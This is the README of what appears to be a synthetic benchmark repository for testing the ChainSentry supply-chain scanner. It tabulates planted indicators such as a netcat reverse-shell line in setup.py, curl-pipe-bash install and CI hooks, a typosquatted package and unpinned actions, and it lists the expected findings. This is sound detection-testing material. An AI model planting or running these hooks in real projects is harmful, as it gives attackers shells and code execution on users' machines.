# ChainSentry Demo Repository

This is a **synthetic benchmark repository** with deliberately planted supply chain attack indicators. It is used to validate that ChainSentry detects the full spectrum of threats it is designed to catch.

---

## Planted Attack Signals

| # | Category | Attack Vector | File | Indicator |
|---|---|---|---|---|
| 1 | Known CVE | Vulnerable direct dependency | `package.json` | `express@4.17.1` — GHSA-rv95-896h-c2vc |
| 2 | Known CVE | Vulnerable direct dependency | `package.json` | `lodash@4.17.20` — GHSA-29mw-wpgm-hmr9 |
| 3 | Transitive CVE | Multi-hop sub-dependency chain | `package-lock.json` | `express -> qs@6.5.2` (Prototype Pollution) |
| 4 | Integrity | Plaintext HTTP registry URL | `package-lock.json` | `http://registry.npmjs.org/qs/...` (MitM risk) |
| 5 | Typosquatting | Lexical lookalike package | `package.json` | `expreess` — edit distance 1 from `express` |
| 6 | Dependency Confusion | Internal namespace collision | `package.json` | `internal-auth-service`, `company-payments-sdk` |
| 7 | Lifecycle Hook | Malicious install script | `package.json` | `"postinstall": "node -e require('child_process')..."` |
| 8 | Lifecycle Hook | Network download on install | `package.json` | `"prepare": "curl ... \| bash"` |
| 9 | CI/CD Poisoning | Unpinned mutable action ref | `.github/workflows/ci.yml` | `uses: actions/checkout@master` |
| 10 | CI/CD Poisoning | Excessive token permissions | `.github/workflows/ci.yml` | `permissions: write-all` |
| 11 | CI/CD Poisoning | Untrusted pipe execution | `.github/workflows/ci.yml` | `run: curl ... \| bash` |
| 12 | AST Backdoor | Reverse shell in install hook | `setup.py` | `os.system("nc -e /bin/sh 10.10.14.5 4444")` |
| 13 | Reputation | Version spike anomaly | `requirements.txt` | `internal-vault==99.0.0` |

---

## Running a Scan Against This Benchmark

### CLI

```bash
# Summary table in terminal
python -m backend.cli ./demo-repository

# Export SBOM and SARIF
python -m backend.cli ./demo-repository --sbom sbom.cdx.json --sarif results.sarif

# Quality gate (exits with code 1 — P0 findings present)
python -m backend.cli ./demo-repository --gate
```

### API

Start the server first:

```bash
uvicorn backend.main:app --reload
```

Then scan via the REST API:

```bash
curl -X POST http://127.0.0.1:8000/api/v1/scans \
  -H "Content-Type: application/json" \
  -d '{"repo_url": "./demo-repository"}'
```

Retrieve results using the returned `scan_id`:

```bash
curl http://127.0.0.1:8000/api/v1/scans/{scan_id}/results
```

---

## Expected Findings

A complete scan of this repository should produce:

- At least **3 P0 (Critical/Immediate)** findings — lifecycle scripts, AST backdoor, CI/CD poisoning
- At least **4 P1 (High)** findings — known CVEs, typosquatting, dependency confusion
- At least **2 P2 (Medium)** findings — transitive CVEs, reputation signals
- A security score below **25** (CRITICAL risk level)
- A dependency graph with blast-radius calculations across all planted packages

If ChainSentry does not surface these findings, the scan engine has a gap.